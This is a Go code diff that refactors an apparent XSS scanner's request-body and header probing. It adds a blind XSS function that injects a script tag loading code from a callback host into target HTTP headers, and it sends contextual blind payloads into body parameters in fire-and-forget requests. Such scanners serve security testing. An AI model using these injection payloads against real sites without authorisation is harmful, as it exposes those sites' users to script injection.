@@ -1,13 +1,13 @@
 package scanner
 
 import (
+	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
 	"net/url"
-	"os"
 	"strings"
 	"time"
 
@@ -28,29 +28,32 @@ var VulnerableHeaders = []string{
 }
 
 // ScanRequest performs XSS scan on POST/PUT/PATCH requests with body parameters
-func (s *Scanner) ScanRequest(config *models.RequestConfig) ([]models.Result, error) {
+func (s *Scanner) ScanRequest(ctx context.Context, config *models.RequestConfig) ([]models.Result, error) {
 	results := []models.Result{}
 
 	// 1. Parse body parameters
-	params := s.parseBodyParams(config.Body, string(config.ContentType))
+	params := parseBodyParams(config.Body, string(config.ContentType))
 	if len(params) == 0 {
 		return results, nil
 	}
 
 	// 2. Baseline check: see which parameters are reflected
-	reflectedParams := s.checkBodyReflection(config, params)
+	reflectedParams, err := s.checkBodyReflection(config, params)
+	if err != nil {
+		return results, err
+	}
 
 	// 3. Scan Body Parameters
 	if config.Method == "POST" || config.Method == "PUT" || config.Method == "PATCH" {
 		for _, param := range reflectedParams {
-			result, err := s.probeBodyParameter(config, param, params)
+			result, err := s.probeRequestParameter(ctx, config, param)
 			if err != nil {
 				continue
 			}
 
 			// Contextual Blind XSS Injection (after context detection)
 			if s.blindURL != "" && result.Context != models.ContextUnknown {
-				s.injectContextualBlindBody(config, param, params, result.Context)
+				s.injectContextualBlindBody(config, param, result.Context)
 			}
 
 			if len(result.Unfiltered) > 0 {
@@ -62,7 +65,7 @@ func (s *Scanner) ScanRequest(config *models.RequestConfig) ([]models.Result, er
 	return results, nil
 }
 
-func (s *Scanner) parseBodyParams(body, contentType string) map[string]string {
+func parseBodyParams(body, contentType string) map[string]string {
 	params := make(map[string]string)
 	if contentType == "application/json" {
 		// Simple JSON parser (flat key-value for now)
@@ -90,7 +93,7 @@ func (s *Scanner) parseBodyParams(body, contentType string) map[string]string {
 	return params
 }
 
-func (s *Scanner) checkBodyReflection(config *models.RequestConfig, params map[string]string) []string {
+func (s *Scanner) checkBodyReflection(config *models.RequestConfig, params map[string]string) ([]string, error) {
 	reflected := []string{}
 
 	for key := range params {
@@ -106,12 +109,9 @@ func (s *Scanner) checkBodyReflection(config *models.RequestConfig, params map[s
 		// Build request body
 		var body string
 		if config.ContentType == "application/json" {
-			// Reconstruct JSON (simplified)
-			pairs := []string{}
-			for k, v := range testParams {
-				pairs = append(pairs, fmt.Sprintf(`"%s":"%s"`, k, v))
-			}
-			body = "{" + strings.Join(pairs, ",") + "}"
+			// Reconstruct JSON properly
+			jsonBytes, _ := json.Marshal(testParams)
+			body = string(jsonBytes)
 		} else {
 			// Reconstruct form-urlencoded
 			v := url.Values{}
@@ -131,6 +131,7 @@ func (s *Scanner) checkBodyReflection(config *models.RequestConfig, params map[s
 			req.Header.Set(k, v)
 		}
 
+		start := time.Now()
 		resp, err := s.client.Do(req)
 		s.requestMutex.Lock()
 		s.requestCount++
@@ -141,6 +142,7 @@ func (s *Scanner) checkBodyReflection(config *models.RequestConfig, params map[s
 
 		bodyBytes, err := io.ReadAll(resp.Body)
 		resp.Body.Close()
+		elapsed := time.Since(start)
 		if err != nil {
 			continue
 		}
@@ -148,55 +150,31 @@ func (s *Scanner) checkBodyReflection(config *models.RequestConfig, params map[s
 
 		if strings.Contains(respBody, probe) {
 			reflected = append(reflected, key)
+			s.logger.Detail("Reflected: YES (%s) (%d bytes, %v)", key, len(bodyBytes), elapsed)
+		} else {
+			s.logger.Detail("Reflected: NO (%s) (%d bytes, %v)", key, len(bodyBytes), elapsed)
 		}
 	}
 
-	return reflected
+	return reflected, nil
 }
 
-func (s *Scanner) probeBodyParameter(config *models.RequestConfig, param string, params map[string]string) (models.Result, error) {
+func (s *Scanner) probeRequestParameter(ctx context.Context, config *models.RequestConfig, param string) (models.Result, error) {
+	s.logger.Section(fmt.Sprintf("Probing Parameter: %s", param))
+
+	params := parseBodyParams(config.Body, string(config.ContentType))
 	val := params[param]
+
 	probeStr := "xssprobe"
 	payload := val + probeStr + strings.Join(reflection.SpecialChars, "") + probeStr
 
-	// Create a copy of params with payload
-	testParams := make(map[string]string)
-	for k, v := range params {
-		testParams[k] = v
-	}
-	testParams[param] = payload
+	testBody := createBodyWithProbe(params, param, payload, config.ContentType)
 
-	// Build request body
-	var body string
-	if config.ContentType == "application/json" {
-		// Reconstruct JSON properly using Marshal to handle escaping
-		jsonBytes, err := json.Marshal(testParams)
-		if err != nil {
-			return models.Result{}, err
-		}
-		body = string(jsonBytes)
-	} else {
-		// Reconstruct form-urlencoded
-		if s.useRawPayload {
-			// Manual construction to avoid encoding
-			parts := []string{}
-			for k, v := range testParams {
-				parts = append(parts, k+"="+v)
-			}
-			body = strings.Join(parts, "&")
-		} else {
-			v := url.Values{}
-			for k, val := range testParams {
-				v.Set(k, val)
-			}
-			body = v.Encode()
-		}
-	}
-
-	req, err := http.NewRequest(string(config.Method), config.URL, strings.NewReader(body))
+	req, err := http.NewRequestWithContext(ctx, string(config.Method), config.URL, bytes.NewBufferString(testBody))
 	if err != nil {
 		return models.Result{}, err
 	}
+
 	req.Header.Set("Content-Type", string(config.ContentType))
 	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
 	for k, v := range s.headers {
@@ -214,27 +192,20 @@ func (s *Scanner) probeBodyParameter(config *models.RequestConfig, param string,
 	return s.AnalyzeReflection(config.URL, string(config.Method), param, models.InjectionBody, resp, probeStr)
 }
 
-// ScanHeader checks for XSS in a specific HTTP header
-func (s *Scanner) ScanHeader(targetURL, header string) (models.Result, error) {
-	// Blind XSS Injection
-	if s.blindURL != "" {
-		payloads.InjectBlindHeader(s.client, s.headers, targetURL, header, s.blindURL, s.verbose)
-	}
+// ScanHeader scans a specific HTTP header for XSS
+func (s *Scanner) ScanHeader(ctx context.Context, targetURL, headerName string) (models.Result, error) {
+	probeStr := "xssprobe"
+	payload := probeStr + strings.Join(reflection.SpecialChars, "") + probeStr
 
-	// 1. Check if header is reflected
-	probe := fmt.Sprintf("xxss_%d", time.Now().UnixNano())
-
-	req, err := http.NewRequest("GET", targetURL, nil)
+	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
 	if err != nil {
 		return models.Result{}, err
 	}
 
-	req.Header.Set(header, probe)
+	req.Header.Set(headerName, payload)
 	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
-
-	// Add custom headers
 	for k, v := range s.headers {
-		if k != header {
+		if k != headerName {
 			req.Header.Set(k, v)
 		}
 	}
@@ -247,101 +218,82 @@ func (s *Scanner) ScanHeader(targetURL, header string) (models.Result, error) {
 		return models.Result{}, err
 	}
 
-	bodyBytes, err := io.ReadAll(resp.Body)
-	resp.Body.Close()
-	if err != nil {
-		return models.Result{}, err
-	}
-	body := string(bodyBytes)
-
-	if !strings.Contains(body, probe) {
-		return models.Result{}, fmt.Errorf("header not reflected")
+	// Blind XSS injection for headers
+	if s.blindURL != "" {
+		// We don't know context yet, but headers are usually raw or HTML
+		// We can inject a generic blind payload
+		s.injectBlindHeader(targetURL, headerName)
 	}
 
-	// 2. Probe with XSS payload
-	probeStr := "xssprobe"
-	payload := probeStr + strings.Join(reflection.SpecialChars, "") + probeStr
-
-	req2, err := http.NewRequest("GET", targetURL, nil)
-	if err != nil {
-		return models.Result{}, err
-	}
-
-	req2.Header.Set(header, payload)
-	req2.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
-
-	// Add custom headers
-	for k, v := range s.headers {
-		if k != header {
-			req2.Header.Set(k, v)
-		}
-	}
-
-	resp2, err := s.client.Do(req2)
-	s.requestMutex.Lock()
-	s.requestCount++
-	s.requestMutex.Unlock()
-	if err != nil {
-		return models.Result{}, err
-	}
-	// Analyze reflection using shared method
-	return s.AnalyzeReflection(targetURL, "GET", header, models.InjectionHeader, resp2, probeStr)
+	return s.AnalyzeReflection(targetURL, "GET", headerName, models.InjectionHeader, resp, probeStr)
 }
 
 // injectContextualBlindBody injects context-specific blind XSS payloads into POST body
-func (s *Scanner) injectContextualBlindBody(config *models.RequestConfig, param string, params map[string]string, reflectionContext models.ReflectionContext) {
+func (s *Scanner) injectContextualBlindBody(config *models.RequestConfig, param string, context models.ReflectionContext) {
 	uniqueURL := payloads.GenerateUniqueCallback(s.blindURL, param)
-	contextPayloads := payloads.BlindPayloadsForContext(uniqueURL, reflectionContext)
+	contextPayloads := payloads.BlindPayloadsForContext(uniqueURL, context)
 
-	if s.verbose {
-		fmt.Fprintf(os.Stderr, "[BLIND] Body:%s [%s] → %s (%d contextual payloads)\n", param, reflectionContext, uniqueURL, len(contextPayloads))
-	}
+	s.logger.V("[BLIND] Body:%s [%s] → %s (%d contextual payloads)", param, context, uniqueURL, len(contextPayloads))
+
+	params := parseBodyParams(config.Body, string(config.ContentType))
 
 	for _, payload := range contextPayloads {
-		// Create a copy of params with the payload
-		injectedParams := make(map[string]string)
-		for k, v := range params {
-			injectedParams[k] = v
+		testBody := createBodyWithProbe(params, param, payload, config.ContentType)
+
+		req, err := http.NewRequest(string(config.Method), config.URL, bytes.NewBufferString(testBody))
+		if err != nil {
+			continue
 		}
-		injectedParams[param] = payload
 
-		// Build request body based on content type
-		var body string
-		var contentTypeHeader string
-
-		if config.ContentType == "application/json" {
-			jsonData, err := json.Marshal(injectedParams)
-			if err != nil {
-				continue
-			}
-			body = string(jsonData)
-			contentTypeHeader = "application/json"
-		} else {
-			formData := url.Values{}
-			for k, v := range injectedParams {
-				formData.Set(k, v)
-			}
-			body = formData.Encode()
-			contentTypeHeader = "application/x-www-form-urlencoded"
+		req.Header.Set("Content-Type", string(config.ContentType))
+		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
+		for k, v := range s.headers {
+			req.Header.Set(k, v)
 		}
 
 		// Fire and forget
-		go func(bodyStr string) {
-			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			defer cancel()
-			req, err := http.NewRequestWithContext(ctx, string(config.Method), config.URL, strings.NewReader(bodyStr))
-			if err != nil {
-				return
-			}
-			req.Header.Set("Content-Type", contentTypeHeader)
-			req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
-			for k, v := range s.headers {
-				req.Header.Set(k, v)
-			}
-			resp, err := s.client.Do(req)
-			if err == nil && resp != nil {
-				resp.Body.Close()
-			}
-		}(body)
+		go func(r *http.Request) {
+			s.client.Do(r)
+		}(req)
 	}
+}
+
+func (s *Scanner) injectBlindHeader(targetURL, headerName string) {
+	uniqueURL := payloads.GenerateUniqueCallback(s.blindURL, headerName)
+	payload := fmt.Sprintf("\"><script src=\"%s\"></script>", uniqueURL)
+
+	req, err := http.NewRequest("GET", targetURL, nil)
+	if err != nil {
+		return
+	}
+
+	req.Header.Set(headerName, payload)
+	go func(r *http.Request) {
+		s.client.Do(r)
+	}(req)
+}
+
+func createBodyWithProbe(params map[string]string, targetParam, probe string, contentType models.ContentType) string {
+	if contentType == "application/json" {
+		// Create copy and marshal
+		newParams := make(map[string]string)
+		for k, v := range params {
+			newParams[k] = v
+		}
+		newParams[targetParam] = probe
+
+		jsonBytes, _ := json.Marshal(newParams)
+		return string(jsonBytes)
+	}
+
+	// Reconstruct form-urlencoded
+	v := url.Values{}
+	for k, val := range params {
+		if k == targetParam {
+			v.Set(k, probe)
+		} else {
+			v.Set(k, val)
+		}
+	}
+	return v.Encode()
 }
